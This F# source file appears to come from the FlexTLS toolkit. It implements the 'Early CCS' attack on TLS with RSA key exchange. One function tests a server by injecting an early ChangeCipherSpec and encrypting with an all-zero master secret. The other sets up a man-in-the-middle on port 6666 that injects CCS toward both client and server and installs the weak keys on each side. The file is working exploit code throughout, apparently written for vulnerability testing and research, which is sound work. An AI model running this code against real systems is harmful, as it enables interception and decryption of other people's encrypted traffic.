#light "off"

module FlexApps.Attack_EarlyCCS

open Bytes
open TLSInfo
open TLSConstants

open FlexTLS
open FlexTypes
open FlexConstants
open FlexConnection
open FlexRecord
open FlexClientHello
open FlexServerHello
open FlexCertificate
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexCCS
open FlexFinished
open FlexState
open FlexSecrets
open FlexHandshake




type Attack_EarlyCCS =
    class

    static member run (server_name:string, ?port:int) : state =
        let port = defaultArg port FlexConstants.defaultTCPPort in

        // Start TCP connection with the server
        let st,_ = FlexConnection.clientOpenTcpConnection(server_name,server_name,port) in

        // Ensure we use RSA
        let fch = {FlexConstants.nullFClientHello with
            suites = [TLS_RSA_WITH_AES_128_CBC_SHA] } in

        let st,nsc,fch   = FlexClientHello.send(st,fch) in
        let st,nsc,fsh   = FlexServerHello.receive(st,fch,nsc) in
        let st,nsc,fcert = FlexCertificate.receive(st,Client,nsc) in
        let st,fshd      = FlexServerHelloDone.receive(st) in

        // Inject early CCS and start encrypting early
        let st,_         = FlexCCS.send(st) in

        // We fill the master secret with zeros because it has no data from the KEX yet
        // Then we compute and install the writing keys
        let epk          = { nsc.keys with ms = (Bytes.createBytes 48 0)} in
        let nsc          = { nsc with keys = epk} in
        let nscAtt       = FlexSecrets.fillSecrets(st,Client,nsc) in
        let st           = FlexState.installWriteKeys st nscAtt in

        // If this step go through, the peer is suceptible to the attack
        // It should throw a "Unexpected message" fatal alert because of the early CCS
        
        // We continue the usual handshake procedure
        let st,nsc,fcke  = FlexClientKeyExchange.sendRSA(st,{nscAtt with keys = FlexConstants.nullKeys},fch) in
        
        let log          = fch.payload @| fsh.payload @| fcert.payload @| fshd.payload  @| fcke.payload in
        let st,ffC       = FlexFinished.send(st,logRoleNSC=(log,Client,nsc)) in
        let st,_,_       = FlexCCS.receive(st) in

        // Start decrypting
        let st           = FlexState.installReadKeys st nscAtt in

        let verify_data  = FlexSecrets.makeVerifyData nsc.si nsc.keys.ms Server (log @| ffC.payload) in
        let st,ffS       = FlexFinished.receive(st,verify_data) in
        st

    static member runMITM (accept, server_name:string, ?port:int) : state * state =
        let port = defaultArg port FlexConstants.defaultTCPPort in

        // Start being a Man-In-The-Middle
        let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections("0.0.0.0",server_name,listener_port=6666,server_cn=server_name,server_port=port) in

        // Forward client Hello
        let sst,nsc,sch = FlexClientHello.receive(sst) in
        let cst     = FlexHandshake.send(cst,sch.payload) in
        
        // Forward server hello and control the ciphersuite
        let cst,nsc,csh   = FlexServerHello.receive(cst,sch,nsc) in
        if not (TLSConstants.isRSACipherSuite (TLSConstants.cipherSuite_of_name (getSuite csh))) then
            failwith "Early CCS attack demo only implemented for RSA key exchange"
        else
        let sst = FlexHandshake.send(sst,csh.payload) in

        // Inject CCS to everybody
        let sst,_ = FlexCCS.send(sst) in
        let cst,_ = FlexCCS.send(cst) in

        // Compute the weak keys and start encrypting data we send
        let weakKeys      = { FlexConstants.nullKeys with ms = (Bytes.createBytes 48 0)} in
        let weakNSC       = { nsc with keys = weakKeys} in

        let weakNSCServer = FlexSecrets.fillSecrets(sst,Server,weakNSC) in
        let sst = FlexState.installWriteKeys sst weakNSCServer in
        
        let weakNSCClient = FlexSecrets.fillSecrets(cst,Client,weakNSC) in
        let cst = FlexState.installWriteKeys cst weakNSCClient in

        // Forward server certificate, server hello done and client key exchange
        let cst,sst,_ = FlexHandshake.forward(cst,sst) in
        let cst,sst,_ = FlexHandshake.forward(cst,sst) in
        let sst,cst,_ = FlexHandshake.forward(sst,cst) in

        // Get the Client CCS, drop it, but install new weak reading keys
        let sst,_,_ = FlexCCS.receive(sst) in
        let sst   = FlexState.installReadKeys sst weakNSCServer in

        // Forward the client finished message
        let sst,cst,_ = FlexHandshake.forward(sst,cst) in

        // Forward the server CCS, and install weak reading keys on the client side
        let cst,_,_ = FlexCCS.receive(cst) in
        let cst   = FlexState.installReadKeys cst weakNSCClient in
        let sst,_ = FlexCCS.send(sst) in

        // Forward server finished message
        let cst,sst,_ = FlexHandshake.forward(cst,sst) in
        sst,cst
    end





